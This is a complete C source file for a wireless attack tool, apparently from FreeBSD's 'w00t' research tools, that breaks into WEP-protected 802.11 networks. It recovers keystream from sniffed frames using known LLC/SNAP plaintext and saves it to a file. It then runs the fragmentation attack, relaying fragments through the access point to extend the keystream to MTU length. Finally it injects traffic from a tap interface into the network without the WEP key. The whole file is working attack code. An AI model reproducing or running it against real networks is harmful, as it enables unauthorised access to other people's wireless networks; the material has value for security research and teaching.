/*-
 * Copyright (c) 2006, Andrea Bittau <a.bittau@cs.ucl.ac.uk>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * $FreeBSD$
 */
#include <sys/endian.h>
#include <sys/time.h>
#include <sys/select.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <zlib.h>
#include "w00t.h"


static char *known_pt_arp = "\xAA\xAA\x03\x00\x00\x00\x08\x06";
static char *known_pt_ip = "\xAA\xAA\x03\x00\x00\x00\x08\x00";
static int known_pt_len = 8;

enum {
	S_START = 0,
	S_SEND_FRAG,
	S_WAIT_ACK,
	S_WAIT_RELAY
};

struct params {
	int tx;
	int rx;
	
	char mac[6];
	char ap[6];
	
	char prga[2048];
	int prga_len;
	char iv[3];

	char *fname;

	struct timeval last;
	char packet[2048];
	int packet_len;
	int state;

	char data[2048];
	char *data_ptr;
	int data_len;
	int data_try;
	int mtu;

	int seq;
	int frag;

	int tap;
};

void usage(char *p)
{
	printf("Usage: %s <opts>\n"
	       "-h\thelp\n"
	       "-b\t<bssid>\n"
	       "-t\t<tap>\n"
	       , p);
	exit(0);
}

void load_prga(struct params *p)
{
	int fd;
	int rd;

	fd = open(p->fname, O_RDONLY);
	if (fd == -1) {
		p->prga_len = 0;
		return;
	}

	rd = read(fd, p->iv, 3);
	if (rd == -1)
		err(1, "read()");
	if (rd != 3) {
		printf("Short read\n");
		exit(1);
	}

	rd = read(fd, p->prga, sizeof(p->prga));
	if (rd == -1)
		err(1, "read()");
	p->prga_len = rd;
	
	printf("Loaded %d PRGA from %s\n", p->prga_len, p->fname);
	close(fd);
}

void save_prga(struct params *p)
{
	int fd;
	int rd;

	fd = open(p->fname, O_WRONLY | O_CREAT, 0644);
	if (fd == -1)
		err(1, "open()");

	rd = write(fd, p->iv, 3);
	if (rd == -1)
		err(1, "write()");
	if (rd != 3) {
		printf("Short write\n");
		exit(1);
	}

	rd = write(fd, p->prga, p->prga_len);
	if (rd == -1)
		err(1, "write()");
	if (rd != p->prga_len) {
		printf("Wrote %d/%d\n", rd, p->prga_len);
		exit(1);
	}
	close(fd);

	printf("Got %d bytes of PRGA\n", p->prga_len);
}

int is_arp(struct ieee80211_frame *wh, int len)
{
	/* XXX */
	if (len > (sizeof(*wh) + 4 + 4 + 39))
		return 0;

	return 1;	
}

void get_prga(struct params *p)
{
	char buf[4096];
	int rc;
        struct ieee80211_frame *wh;
	char *bssid;
	char *ptr;
	char *known_pt;

        rc = sniff(p->rx, buf, sizeof(buf));
        if (rc == -1)
                err(1, "sniff()");

        wh = get_wifi(buf, &rc);
        if (!wh)
                return;

	if (!frame_type(wh, IEEE80211_FC0_TYPE_DATA,
			IEEE80211_FC0_SUBTYPE_DATA))
		return;
	
	if (is_arp(wh, rc))
		known_pt = known_pt_arp;
	else
		known_pt = known_pt_ip;

	if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
		bssid = wh->i_addr1;
	else
		bssid = wh->i_addr2;

	if (memcmp(p->ap, bssid, 6) != 0)
		return;

	if (!(wh->i_fc[1] & IEEE80211_FC1_PROTECTED)) {
		printf("Packet not WEP!\n");
		return;
	}

	ptr = (char*) (wh+1);
	memcpy(p->iv, ptr, 3);
	ptr += 4;
	rc -= sizeof(wh) + 4;

	assert(rc >= known_pt_len);

	for (rc = 0; rc < known_pt_len; rc++) {
		p->prga[rc] = known_pt[rc] ^ (*ptr);
		ptr++;
	}

	p->prga_len = rc;
	save_prga(p);
}

void start(struct params *p)
{
	int len;

	len = p->prga_len;
	len -= 4;
	assert(len > 0);

	len *= 4;
	if (len > p->mtu)
		len = p->mtu;

	p->data_len = len;
	memset(p->data, 0, p->data_len);
	memcpy(p->data, "\xaa\xaa\x03\x00\x00\x00\x08\x06", 8);
	p->data_ptr = p->data;
	p->data_try = 0;
	p->seq++;
	p->frag = 0;
	p->state = S_SEND_FRAG;
}

void send_packet(struct params *p)
{
	int rc;
	struct ieee80211_frame *wh;

	rc = inject(p->tx, p->packet, p->packet_len);
	if (rc == -1)
		err(1, "inject()");
	if (rc != p->packet_len) {
		printf("Wrote %d/%d\n", rc, p->packet_len);
		exit(1);
	}

	p->data_try++;
	wh = (struct ieee80211_frame*) p->packet;
	wh->i_fc[1] |= IEEE80211_FC1_RETRY;

	if (gettimeofday(&p->last, NULL) == -1)
		err(1, "gettimeofday()");
}

void send_frag(struct params *p)
{
	struct ieee80211_frame *wh;
	int dlen, rem;
	int last = 0;
	short *seqp;
	char *ptr;
	uLong *pcrc;
	uLong crc = crc32(0L, Z_NULL, 0);
	int i;

	memset(p->packet, 0, sizeof(p->packet));
	wh = (struct ieee80211_frame*) p->packet;

	/* calculate how much data we need to copy */
	dlen = p->prga_len - 4;
	rem = p->data_ptr - p->data;
	rem = p->data_len - rem;

	if (rem <= dlen) {
		dlen = rem;
		last = 1;
	}

	/* 802.11 */
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS;
	if (!last)
		wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;

	wh->i_dur[0] = 0x69;
	wh->i_dur[1] = 0x00;
	
	memcpy(wh->i_addr1, p->ap, 6);
	memcpy(wh->i_addr2, p->mac, 6);
	memset(wh->i_addr3, 0xff, 6);

	seqp = (short*) wh->i_seq;
	*seqp = seqfn(p->seq, p->frag);
	p->frag++;

	/* IV & data */
	ptr = (char*) (wh+1);
	memcpy(ptr, p->iv, 3);
	ptr += 4;
	memcpy(ptr, p->data_ptr, dlen);

	/* crc */
	crc = crc32(crc, ptr, dlen);
	pcrc = (uLong*) (ptr+dlen);
	*pcrc = crc;

	/* wepify */
	for (i = 0; i < dlen+4; i++)
		ptr[i] = ptr[i] ^ p->prga[i];

	/* prepare for next frag */
	p->packet_len = sizeof(*wh) + 4 + dlen + 4;
	p->data_ptr += dlen;
#if 0
	printf("Sening %sfrag [%d/%d] [len=%d]\n", last ? "last " : "",
	       p->seq, p->frag, dlen);
#endif	
	if (last) {
		p->data_ptr = p->data;
		p->frag = 0;
		p->seq++;
	}

	/* send it off */
	send_packet(p);
	p->state = S_WAIT_ACK;
}

void wait_ack(struct params *p)
{
	struct timeval now;
	int el;
	int tout = 10*1000;
	fd_set fds;
	int rc;
	char buf[4096];
	struct ieee80211_frame *wh;

	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");

	/* check for timeout */
	el = elapsed(&p->last, &now);
	if (el >= tout) {
		if (p->data_try >= 3) {
#if 0		
			printf("Re-sending whole lot\n");
#endif			
			p->state = S_START;
			return;
		}
#if 0
		printf("Re-sending frag\n");
#endif		
		send_packet(p);
		el = 0;
	}

	el = tout - el;
	now.tv_sec = el/1000/1000;
	now.tv_usec = el - now.tv_sec*1000*1000;

	FD_ZERO(&fds);
	FD_SET(p->rx, &fds);
	if (select(p->rx+1, &fds, NULL, NULL, &now) == -1)
		err(1, "select()");

	if (!FD_ISSET(p->rx, &fds))
		return;

	/* grab ack */
        rc = sniff(p->rx, buf, sizeof(buf));
        if (rc == -1)
                err(1, "sniff()");

        wh = get_wifi(buf, &rc);
        if (!wh)
                return;

	if (!frame_type(wh, IEEE80211_FC0_TYPE_CTL, IEEE80211_FC0_SUBTYPE_ACK))
		return;

	if (memcmp(p->mac, wh->i_addr1, 6) != 0)
		return;

	/* wait for relay */
	if (p->frag == 0) {
		p->state = S_WAIT_RELAY;
		if (gettimeofday(&p->last, NULL) == -1)
			err(1, "gettimeofday()");
	}
	else
		p->state = S_SEND_FRAG;
}

void wait_relay(struct params *p)
{
	int tout = 20*1000;
	struct timeval now;
	int el;
	fd_set fds;
	int rc;
	char buf[4096];
	struct ieee80211_frame *wh;
	char *ptr;
	uLong crc = crc32(0L, Z_NULL, 0);
	uLong *pcrc;

	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");

	el = elapsed(&p->last, &now);
	if (el >= tout) {
#if 0	
		printf("No relay\n");
#endif		
		p->state = S_START;
		return;
	}
	el = tout - el;
	now.tv_sec = el/1000/1000;
	now.tv_usec = el - now.tv_sec*1000*1000;

	FD_ZERO(&fds);
	FD_SET(p->rx, &fds);
	if (select(p->rx+1, &fds, NULL, NULL, &now) == -1)
		err(1, "select()");
	
	if (!FD_ISSET(p->rx, &fds))
		return;

	/* get relay */
        rc = sniff(p->rx, buf, sizeof(buf));
        if (rc == -1)
                err(1, "sniff()");

        wh = get_wifi(buf, &rc);
        if (!wh)
                return;

	if (!frame_type(wh, IEEE80211_FC0_TYPE_DATA,
			IEEE80211_FC0_SUBTYPE_DATA))
		return;

	if (memcmp(wh->i_addr2, p->ap, 6) != 0)
		return;

	if (memcmp(wh->i_addr3, p->mac, 6) != 0)
		return;

	if (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) != 0)
		return;

	/* lends different due to padding? */
	if ( (rc - sizeof(*wh) - 8) != p->data_len)
		return;
	
	/* grab new PRGA */
	assert(p->data_len >= p->prga_len);
	ptr = (char*) (wh+1);
	memcpy(p->iv, ptr, 3);
	ptr += 4;

	crc = crc32(crc, p->data, p->data_len);
	pcrc = (uLong*) &p->data[p->data_len]; /* XXX overflow ph33r */
	*pcrc = crc;

	for (rc = 0; rc < p->data_len+4; rc++)
		p->prga[rc] = p->data[rc] ^ ptr[rc];

	p->prga_len = p->data_len+4;
	p->state = S_START;
	save_prga(p);
}

void get_more_prga(struct params *p)
{
	switch (p->state) {
	case S_START:
		start(p);
		break;

	case S_SEND_FRAG:
		send_frag(p);
		break;

	case S_WAIT_ACK:
		wait_ack(p);
		break;

	case S_WAIT_RELAY:
		wait_relay(p);
		break;

	default:
		printf("WTF %d\n", p->state);
		abort();
		break;
	}
}

void read_tap(struct params *p)
{
	int offset;
	char *ptr;
	struct ieee80211_frame *wh;
	int rc;
	char dst[6];
	short *seq;
	uLong *pcrc;
	uLong crc = crc32(0L, Z_NULL, 0);

	memset(p->packet, 0, sizeof(p->packet));
	offset = sizeof(*wh) + 4 + 8 - 14;
	rc = sizeof(p->packet) - offset;
	ptr = &p->packet[offset];

	rc = read(p->tap, ptr, rc);
	if (rc == -1)
		err(1, "read()");

	memcpy(dst, ptr, sizeof(dst));
	wh = (struct ieee80211_frame*) p->packet;
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS;

	wh->i_dur[0] = 0x69;

	memcpy(wh->i_addr1, p->ap, 6);
	memcpy(wh->i_addr2, p->mac, 6);
	memcpy(wh->i_addr3, dst, 6);

	seq = (short*) wh->i_seq;
	*seq = seqfn(p->seq++, 0);

	/* data */
	ptr = (char*) (wh+1);
	memcpy(ptr, p->iv, 3);
	ptr += 3;
	*ptr++ = 0;
	memcpy(ptr, "\xAA\xAA\x03\x00\x00\x00", 6);
	rc -= 14;
	rc += 8;
	
	crc = crc32(crc, ptr, rc);
	pcrc = (uLong*) (ptr+rc);
	*pcrc = crc;

	rc += 4;

	assert(p->prga_len >= rc);

	/* wepify */
	for (offset = 0; offset < rc; offset++)
		ptr[offset] ^= p->prga[offset];

	p->packet_len = sizeof(*wh) + 4 + rc;
	p->data_try = 0;
	send_packet(p);
	p->state = S_WAIT_ACK;
}

/* XXX */
void wait_tap_ack(struct params *p)
{
	p->data_try = 0;
	p->frag = 1;
	wait_ack(p);

	if (p->state == S_SEND_FRAG) {
#if 0
		printf("Got ACK\n");
#endif
		p->state = S_START;
	}	
}

void transmit(struct params *p)
{
	switch (p->state) {
	case S_START:
		read_tap(p);
		break;
	
	case S_WAIT_ACK:
		wait_tap_ack(p);
		break;

	default:
		printf("wtf %d\n", p->state);
		abort();
		break;
	}
}

int main(int argc, char *argv[])
{
	struct params p;
	char *iface = "wlan0";
	char *tap = "tap0";
	int ch;

	memset(&p, 0, sizeof(p));
	p.fname = "prga.log";
	memcpy(p.mac, "\x00\x00\xde\xfa\xce\x0d", 6);
	p.state = S_START;
	p.mtu = 1500;
	p.seq = getpid();

	while ((ch = getopt(argc, argv, "hb:t:")) != -1) {
		switch (ch) {
		case 'b':
			if (str2mac(p.ap, optarg) == -1) {
				printf("Can't parse BSSID\n");
				exit(1);
			}
			break;

		case 't':
			tap = optarg;
			break;

		case 'h':
		default:
			usage(argv[0]);
			break;
		}
	}

	/* init */
	if ((p.rx = open_rx(iface)) == -1)
		err(1, "open_rx()");
	if ((p.tx = open_tx(iface)) == -1)
		err(1, "open_tx()");

	if ((p.tap = open_tap(tap)) == -1)
		err(1, "open_tap()");
	if (set_iface_mac(tap, p.mac) == -1)
		err(1, "set_iface_mac()");

	printf("Obtaining PRGA\n");
	/* make sure we got some prga */
	load_prga(&p);

	while (p.prga_len == 0)
		get_prga(&p);

	/* lets grab some more */
	while (p.prga_len < p.mtu)
		get_more_prga(&p);

	/* transmit */
	p.state = S_START;
	while (1)
		transmit(&p);

	exit(0);
}
